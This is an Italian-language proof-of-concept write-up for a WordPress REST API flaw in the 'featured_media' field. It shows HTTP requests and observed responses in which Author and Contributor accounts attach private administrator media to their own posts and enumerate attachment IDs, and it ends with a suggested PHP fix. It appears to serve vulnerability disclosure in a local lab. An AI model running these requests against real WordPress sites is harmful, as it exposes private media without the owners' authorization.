# PoC

PoC ridotti per la ricerca **WordPress REST API `featured_media` Authorization Bypass**.

Uso previsto: laboratorio locale con utenti, post e media di test. Non usare contro installazioni WordPress di terzi senza autorizzazione esplicita.

## Ruoli usati

- Administrator: crea post privato e media privato.
- Author: puo creare/pubblicare post propri.
- Contributor: puo creare post pending, senza `publish_posts` e senza `upload_files`.
- Subscriber: controllo negativo.

## PoC 01 - Author direct create

Baseline negativa:

```text
GET /wp-json/wp/v2/media/<PRIVATE_ADMIN_MEDIA_ID>?context=edit
Author -> 403 Forbidden
```

Richiesta vulnerabile:

```http
POST /wp-json/wp/v2/posts

{
  "title": "AUTHOR DIRECT FEATURED EXPLOIT",
  "content": "local lab body",
  "status": "publish",
  "featured_media": <PRIVATE_ADMIN_MEDIA_ID>
}
```

Risultato osservato:

```text
HTTP/1.1 201 Created
featured_media=<PRIVATE_ADMIN_MEDIA_ID>
```

Proof DB attesa:

```text
post pubblico author -> _thumbnail_id=<PRIVATE_ADMIN_MEDIA_ID>
media admin privato  -> post_author=<ADMIN_ID>, post_parent=<ADMIN_PRIVATE_POST_ID>
```

Proof frontend attesa:

```html
<img src="/wp-content/uploads/.../admin-private-direct-featured.png"
     alt="ADMIN_PRIVATE_DIRECT_MEDIA_ALT_SECRET" />
```

## PoC 02 - Author update existing post

Baseline:

```text
Author crea un proprio post pubblico con featured_media=0.
Author non puo leggere il media admin privato via REST: 403.
```

Richiesta vulnerabile:

```http
PATCH /wp-json/wp/v2/posts/<AUTHOR_POST_ID>

{
  "featured_media": <PRIVATE_ADMIN_MEDIA_ID>
}
```

Risultato osservato:

```text
HTTP/1.1 200 OK
featured_media=<PRIVATE_ADMIN_MEDIA_ID>
```

Effetto: il post resta dell'Author, ma l'immagine in evidenza diventa un media privato admin e il frontend la renderizza pubblicamente.

## PoC 03 - ID oracle

Setup:

```text
Author crea un draft personale e prova ID progressivi nel campo featured_media.
```

Output osservato:

```text
miss: media_id=192 -> featured_media=0
hit:  media_id=193 -> accepted as featured_media
miss: media_id=194 -> featured_media=0
hit:  media_id=196 -> accepted as featured_media
```

Significato: un ID accettato indica un attachment immagine valido, anche se non leggibile direttamente via REST.

## PoC 04 - Contributor pending staging

Capability contributor osservate:

```text
read=YES
edit_posts=YES
publish_posts=NO
upload_files=NO
edit_others_posts=NO
```

Richiesta vulnerabile:

```http
POST /wp-json/wp/v2/posts

{
  "title": "CONTRIBUTOR PENDING FEATURED ABUSE",
  "content": "local lab body",
  "status": "pending",
  "featured_media": <PRIVATE_ADMIN_MEDIA_ID>
}
```

Risultato osservato:

```text
HTTP/1.1 201 Created
status=pending
featured_media=<PRIVATE_ADMIN_MEDIA_ID>
```

Proof DB attesa:

```text
post pending contributor -> _thumbnail_id=<PRIVATE_ADMIN_MEDIA_ID>
```

Step finale: se un admin pubblica normalmente il post pending, il frontend espone il media privato admin.

## Controlli negativi

- Author non puo leggere direttamente post privato admin.
- Author non puo leggere direttamente media admin privato via REST.
- Subscriber non puo modificare il post dell'Author.
- Il media resta formalmente non leggibile via `/wp/v2/media/<id>` per utenti non autorizzati.
- L'esposizione avviene tramite relazione accettata e rendering frontend.

## Evidenze locali

```text
/tmp/wp_rest_featured_media_private_admin_poc_1777562064.txt
/tmp/wp_rest_featured_media_create_direct_poc_1777562160.txt
/tmp/wp_rest_featured_media_id_oracle_chain_1777562299.txt
/tmp/wp_rest_featured_media_contributor_chain_1777571359.txt
```

Marker osservati nel frontend:

```text
ADMIN_PRIVATE_MEDIA_ALT_SECRET_1777562064
ADMIN_PRIVATE_DIRECT_MEDIA_ALT_SECRET_1777562160
ADMIN_PRIVATE_ORACLE_MEDIA_ALT_SECRET_1777562299
ADMIN_PRIVATE_CONTRIBUTOR_MEDIA_ALT_SECRET_1777571359
```

## Fix concettuale

Prima di accettare `featured_media`, verificare che l'utente corrente possa leggere/usare l'attachment target.

```php
if ( $featured_media && ! current_user_can( 'read_post', $featured_media ) ) {
    return new WP_Error(
        'rest_cannot_use_featured_media',
        __( 'Sorry, you are not allowed to use this media item as featured media.' ),
        array( 'status' => rest_authorization_required_code() )
    );
}
```
